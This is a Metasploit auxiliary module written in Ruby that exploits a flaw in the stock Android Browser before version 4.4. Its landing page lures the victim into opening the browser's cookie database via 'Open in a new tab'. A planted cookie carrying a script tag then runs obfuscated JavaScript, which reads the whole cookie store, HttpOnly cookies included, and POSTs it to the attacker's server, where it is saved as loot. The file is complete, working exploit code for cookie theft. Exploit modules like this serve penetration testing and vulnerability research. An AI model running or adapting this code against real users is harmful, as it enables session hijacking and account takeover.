##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/jsobfu'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::JSObfu

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Android Browser "Open in New Tab" Cookie Theft',
      'Description' => %q{
        In Android's stock AOSP Browser application and WebView component, the
        "open in new tab" functionality allows a file URL to be opened. On
        versions of Android before 4.4, the path to the sqlite cookie
        database could be specified. By saving a cookie containing a <script>
        tag and then loading the sqlite database into the browser as an HTML file,
        XSS can be achieved inside the cookie file, disclosing *all* cookies
        (HttpOnly or not) to an attacker.
      },
      'Author'         => [
        'Rafay Baloch', # Discovery of "Open in new tab" bug
        'joev'          # Cookie theft vector, msf module
      ],
      'License'     => MSF_LICENSE,
      'Actions'     => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' =>
        [
          # the patch, released against 4.3 AOSP in February 2014
          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],
          ['URL', 'http://www.rafayhackingarticles.net/2014/12/android-browser-cross-scheme-data.html']
        ],
      'DefaultAction'  => 'WebServer'
    ))

     register_options([
      OptString.new('COOKIE_FILE', [
        true,
        'The cookie file (on older 2.x devices this is "webview.db")',
        'webviewCookiesChromium.db'
      ])
    ])
  end

  def on_request_uri(cli, request)
    if request.method =~ /POST/i
      print_status("Processing exfilrated files...")
      process_post(cli, request)
      send_response_html(cli, '')
    elsif request.uri =~ /\.js$/i
      print_status("Sending exploit javascript")
      send_response(cli, exfiltration_js, 'Content-type' => 'text/javascript')
    else
      print_status("Sending exploit landing page...")
      send_response_html(cli, landing_page_html)
    end
  end

  def process_post(cli, request)
    data = hex2bin(request.body)
    print_good "Cookies received: #{request.body.length.to_f/1024}kb"
    loot_path = store_loot(
      "android.browser.cookies",
      'application/x-sqlite3',
      cli.peerhost,
      data,
      'cookies.sqlite',
      "#{cli.peerhost.ljust(16)} Android browser cookie database"
    )
    print_good "SQLite cookie database saved to:\n#{loot_path}"
  end

  def run
    exploit
  end

  def landing_page_html
    %Q|
    <!doctype html>
      <html>
        <head><meta name="viewport" content="width=device-width, user-scalable=no" /></head>
        <body style='width:100%;font-size: 16px;'>
          <a href='file://#{cookie_path(datastore['COOKIE_FILE'])}##{Rex::Text.encode_base64(exfiltration_js)}'>
            Redirecting... To continue, tap and hold here, then choose "Open in a new tab"
          </a>
          <script>
            #{inline_script}
          </script>
        </body>
      </html>
    |
  end

  def exfiltration_js
    js_obfuscate %Q|
        var x = new XMLHttpRequest();
        x.open('GET', '');
        x.responseType = 'arraybuffer';
        x.onreadystatechange = function(){
          if (x.readyState == 4) {
            var buff = new Uint8Array(x.response);
            var hex = Array.prototype.map.call(buff, function(d){
              var c = d.toString(16);
              return (c.length < 2) ? '0'+c : c;
            }).join('');
            var x2 = new XMLHttpRequest();
            x2.open('POST', '#{get_uri}/');
            x2.setRequestHeader('Content-type', 'text/plain');
            x2.send(hex);
          }
        };
        x.send();

      |
  end

  def inline_script
    %Q|
      document.cookie='#{per_run_token}=<script>eval(atob(location.hash.slice(1)))<\\/script>';
    |
  end

  def cookie_path(file='')
    '/data/data/com.android.browser/databases/' + file
  end

  # TODO: Make this a proper Rex::Text function
  def hex2bin(hex)
    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
  end

  def per_run_token
    @token ||= Rex::Text.rand_text_alpha(rand(2)+1)
  end
end
